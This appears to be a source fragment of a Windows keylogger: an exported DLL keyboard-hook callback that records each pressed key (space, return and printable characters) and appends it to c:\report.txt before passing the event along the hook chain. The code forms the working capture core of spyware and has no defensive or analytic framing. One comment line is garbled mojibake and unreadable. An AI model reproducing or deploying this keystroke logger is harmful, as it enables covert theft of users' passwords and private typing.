 LRESULT __declspec(dllexport)__stdcall CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
 {
	 char ch;
	 if((wParam==VK_SPACE) ||(wParam==VK_RETURN) ||(wParam>=0x2f) &&(wParam<=0x100))
	 {
		 f1=fopen("c:\\report.txt","a+");
		 if(wParam==VK_RETURN)
		 {
			 ch='\n';
			 fwrite(&ch,1,1,f1);
		 }
		 else
		 {
			 BYTE ks[256];
			 GetKeyboardState(ks);
			 WORD w;
			 UINT scan;
			 scan=0;
			 ToAscii(wParam,scan,ks,&w,0);
			 ch=char(w);
			 fwrite(&ch,1,1,f1);
		 }
		 fclose(f1);
	 }
//╫╚╪ЭелоШо╒╢╚╣щ╦ЬфДкШ╧Ёвса╢ио╣дЁлпР
	 LRESULT RetVal=CallNextHookEx(hkb,nCode,wParam,lParam);
	 return RetVal;
 }